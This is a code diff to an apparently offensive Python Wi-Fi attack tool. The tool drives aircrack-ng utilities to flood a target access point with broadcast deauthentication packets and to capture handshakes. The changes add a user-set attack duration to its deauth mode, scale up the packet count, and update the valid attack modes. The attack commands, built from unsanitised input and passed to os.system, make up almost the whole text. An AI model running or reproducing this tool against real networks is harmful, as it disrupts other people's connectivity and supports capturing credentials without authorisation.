@@ -147,7 +147,7 @@ def attack_func(network_interface, attack_mode):
         os.system(
             f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} -w {set_path} {network_interface}mon &")
         time.sleep(5)
-        os.system(f"xterm -hold -e aireplay-ng -0 35 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
+        os.system(f"xterm -hold -e aireplay-ng -0 40 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
         time.sleep(2)
         subprocess.run(["clear"])
         get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
@@ -222,9 +222,9 @@ def attack_func(network_interface, attack_mode):
     elif attack_mode == "DAuth":
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}mon"])
-        # os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
         access_name = input(Fore.YELLOW + "Access point name: ")
         access_channel = input(Fore.YELLOW + "Channel name: ")
+        attack_time = input(Fore.YELLOW + "Time for the attack (seconds): ")
         time.sleep(1)
         get_colours("\n[*] Setting up things...", 'cyan')
         try:
@@ -233,12 +233,12 @@ def attack_func(network_interface, attack_mode):
             process.kill()
         os.system(
             f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} {network_interface}mon &")
-        os.system(f"xterm -hold -e aireplay-ng -0 35 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
+        os.system(f"xterm -hold -e aireplay-ng -0 {int(attack_time) * 200} -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
         subprocess.run(["clear"])
         get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
         process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
         out, err = process1.communicate()
-        timer_total = 70
+        timer_total = int(attack_time)
         timer_process = range(timer_total, 9, -1)
         for i in timer_process:
             get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + str(i)}", 'blue')
@@ -256,6 +256,8 @@ def attack_func(network_interface, attack_mode):
             if b'xterm' in line:
                 pid = int(line.split(None, 1)[0])
                 os.kill(pid, signal.SIGKILL)
+        get_colours("\n\n\n[*] Attack completed successfully", 'green')
+        quit_program()
 
 
 def quit_program():
@@ -282,15 +284,15 @@ def check_parms():
                         get_colours("\nInvalid Network Interface name (Ej: wlan0 / eth0)", "red")
                         print(Fore.WHITE)
                     elif sys.argv[4] not in check_attack_mode:
-                        get_colours("\nSelect a valid attack Mode (Handshake / PKMID)", "red")
+                        get_colours("\nSelect a valid attack Mode (Handshake / PKMID / DAuth)", "red")
                         print(Fore.WHITE)
                     else:
                         check_deps()  # Check for neccesary program to run this script.
                 else:
-                    get_colours("\nSelect a valid attack Mode (Handshake / PKMID)", "red")
+                    get_colours("\nSelect a valid attack Mode (Handshake / PKMID / DAuth)", "red")
                     print(Fore.WHITE)
             else:
-                get_colours("\nSelect a valid attack Mode (Handshake / PKMID)", "red")
+                get_colours("\nSelect a valid attack Mode (Handshake / PKMID / DAuth)", "red")
                 print(Fore.WHITE)
         else:
             get_colours("\nSelect a valid Interface (wlan0 / eth0)", "red")
